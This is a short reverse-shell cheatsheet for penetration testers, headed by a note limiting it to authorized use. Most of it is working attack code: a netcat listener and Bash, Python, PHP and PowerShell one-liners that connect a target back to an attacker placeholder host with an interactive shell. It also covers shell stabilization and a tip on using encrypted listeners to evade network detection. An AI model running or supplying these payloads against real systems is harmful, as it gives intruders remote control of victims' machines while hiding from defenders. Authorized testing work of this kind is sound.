# Reverse Shell Cheatsheet

> For use in authorized labs, CTFs, and pentests only — never against systems you don't have explicit permission to test.

A reverse shell is a technique used (with authorization) during a penetration test to confirm that a vulnerability allows remote command execution — the target connects back to a listener on the tester's machine.

## Setting up a listener

```bash
nc -lvnp 4444
```

## Common one-liners

Replace `ATTACKER_IP` and `PORT` with your listener's address.

**Bash**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Python**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PHP**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PowerShell**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Stabilizing a shell (Linux)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on attacker machine:
stty raw -echo; fg
```

## Notes

- Firewalls/EDR often block outbound reverse shells — test with authorized tooling and expect detection in mature environments.
- Prefer encrypted listeners (e.g. `openssl` or Metasploit's encrypted handlers) when the engagement scope allows, to avoid trivial network-based detection.
- Always clean up shells/processes as part of post-engagement cleanup per your rules of engagement.
